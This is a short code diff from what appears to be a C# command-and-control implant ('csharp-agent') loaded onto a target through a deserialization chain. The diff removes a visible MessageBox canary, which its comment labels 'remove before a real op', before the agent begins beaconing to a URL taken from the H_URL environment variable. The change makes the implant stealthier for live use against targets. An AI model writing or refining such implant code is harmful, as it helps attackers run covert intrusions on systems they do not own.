@@ -30,20 +30,8 @@ namespace CSharpAgent
             Main();
         }
 
-        // DIAGNOSTIC CANARY — remove before a real op. Raw user32 MessageBox (keeps the
-        // single-System-reference build; no System.Windows.Forms). Firing proves the
-        // deserialization chain REACHED this DLL — if the popup shows on the target but
-        // no beacon/upgrade status arrives, the failure is downstream (TLS/transport),
-        // not in the load path. It blocks the static ctor until dismissed, which is the
-        // point: dismissing it starts the beacon, giving a clean two-stage test
-        // (popup = load OK, subsequent beacon = network OK).
-        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
-        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
-
         static void Main()
         {
-            MessageBox(IntPtr.Zero, "dll loaded", "csharp-agent", 0x50040); // info icon | set-foreground | topmost
-
             var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
             if (string.IsNullOrEmpty(beaconUrl))
             {
